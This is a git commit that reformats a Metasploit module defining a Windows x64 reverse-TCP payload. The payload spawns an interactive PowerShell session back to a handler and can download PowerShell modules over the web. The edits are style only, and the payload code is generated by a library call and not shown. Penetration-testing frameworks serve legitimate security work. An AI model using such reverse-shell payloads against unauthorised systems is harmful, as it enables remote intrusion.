e5ef1bb7fcccf8acd5d0232691beeba30801328d
Tim W <timrlw@gmail.com>
2021-11-09 16:23:30 +0000

    rubocop

--- modules/payloads/singles/windows/x64/powershell_reverse_tcp.rb
+++ modules/payloads/singles/windows/x64/powershell_reverse_tcp.rb
@@ -5,7 +5,6 @@
 require 'rex/powershell'
 
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Windows::Exec_x64
@@ -13,30 +12,32 @@ module MetasploitModule
   include Rex::Powershell::Command
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Windows Interactive Powershell Session, Reverse TCP',
-      'Description'   => 'Listen for a connection and spawn an interactive powershell session',
-      'Author'        =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Interactive Powershell Session, Reverse TCP',
+        'Description' => 'Listen for a connection and spawn an interactive powershell session',
+        'Author' => [
           'Ben Turner', # benpturner
           'Dave Hardy' # davehardy20
         ],
-      'References'    =>
-        [
+        'References' => [
           ['URL', 'https://blog.nettitude.com/uk/interactive-powershell-session-via-metasploit/']
         ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'win',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::PowerShell,
-      ))
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::PowerShell
+      )
+    )
 
     # Register command execution options
     register_options(
       [
-        OptString.new('LOAD_MODULES', [ false, "A list of powershell modules separated by a comma to download over the web", nil ]),
-      ])
+        OptString.new('LOAD_MODULES', [ false, 'A list of powershell modules separated by a comma to download over the web', nil ]),
+      ]
+    )
     # Hide the CMD option...this is kinda ugly
     deregister_options('CMD')
   end
@@ -45,6 +46,6 @@ module MetasploitModule
   # Override the exec command string
   #
   def powershell_command
-    generate_powershell_code("Reverse")
+    generate_powershell_code('Reverse')
   end
 end
